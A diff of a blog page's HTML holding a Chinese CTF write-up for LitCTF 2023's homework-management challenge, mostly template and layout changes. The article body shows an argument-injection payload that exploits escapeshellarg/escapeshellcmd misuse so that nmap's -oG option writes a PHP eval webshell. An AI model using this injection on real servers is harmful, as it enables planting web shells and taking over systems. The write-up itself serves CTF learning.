@@ -444,15 +444,15 @@
         </div>
         <hr class="clearfix">
 
-        <!-- 是否加载使用自带的 prismjs.
-        <link rel="stylesheet" href="/libs/prism/prism.min.css"> -->
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
 
-        <!-- 
-         -->
 
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240728182336.png" alt="image.png"></p>
+        
+
+                <div class="card-content article-card-content">
+                    <div id="articleContent">
+                        <p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240728182336.png" alt="image.png"></p>
 <h3 id="LitCTF-2023-作业管理系统"><a href="#LitCTF-2023-作业管理系统" class="headerlink" title="[LitCTF 2023]作业管理系统"></a>[LitCTF 2023]作业管理系统</h3><blockquote>
 <p>交作业！！但是哪里不对？<br>出题人 探姬</p>
 </blockquote>
@@ -480,11 +480,11 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">如果我们直接传入这个，只会被当成字符串无法写入马</span><br><span class="line">那么我们在传入参数的前面添加单引号，后面空格加单引号</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;127.0.0.1 &lt;?php @eval();?&gt; -oG hack.php &#x27;</span></span><br><span class="line"></span><br><span class="line">传进去后变成</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>();<span class="meta">?&gt;</span> -oG hack.php <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">经过escapeshellarg函数处理</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;\&#x27;127.0.0.1 &lt;?php @eval();?&gt; -oG hack.php \&#x27;&#x27;</span></span><br><span class="line"><span class="comment">//在转义的单引号左右添加单引号</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>();<span class="meta">?&gt;</span> -oG hack.php <span class="string">&#x27;\&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">经过escapeshellcmd函数处理</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;127.0.0.1 &lt;?php @eval();?&gt; -oG hack.php &#x27;</span>\\<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">执行结果会对目标\127.0.0.1发送命令&lt;?php @eval();?&gt; -oG hack.php \写入文件</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
 <p>注意最后的空格，不然后缀可能发生变化。</p>
 
-                    
-            </div>
-            <hr />
+                            
+                    </div>
+                    <hr />
 
-            
+                    
 
     <div class="reprint" id="reprint-statement">
         
@@ -538,23 +538,23 @@
 
 
 
-                <div class="tag_share" style="display: block;">
-                    <div class="post-meta__tag-list" style="display: inline-block;">
-                        
-                            <div class="article-tag">
+                        <div class="tag_share" style="display: block;">
+                            <div class="post-meta__tag-list" style="display: inline-block;">
                                 
-                                    <a href="/tags/CTF/">
-                                        <span class="chip bg-color">
-                                            CTF
-                                        </span>
-                                    </a>
+                                    <div class="article-tag">
+                                        
+                                            <a href="/tags/CTF/">
+                                                <span class="chip bg-color">
+                                                    CTF
+                                                </span>
+                                            </a>
+                                            
+                                    </div>
                                     
                             </div>
-                            
-                    </div>
-                    <div class="post_share"
-                        style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                        <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+                            <div class="post_share"
+                                style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                                <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
 <div id="article-share">
 
     
@@ -566,10 +566,10 @@
 
 </div>
 
-                    </div>
+                            </div>
+                        </div>
+                        
                 </div>
-                
-        </div>
     </div>
 
     
@@ -698,20 +698,23 @@
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
 
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+  
 
-<!-- 代码语言 -->
+    <!-- 代码语言 -->
+    
 
+        <!-- 代码块复制 -->
+        
+          <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+          
 
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
+            <!-- 代码块收缩 -->
+            
+              <script type="text/javascript"
+                src="/libs/codeBlock/codeShrink.js"></script>
+              
     </div>
     <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
         <div class="toc-widget card" style="background-color: white;">
@@ -817,7 +820,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">125.3k</span>
+                        class="white-color">125.5k</span>
             
             
             
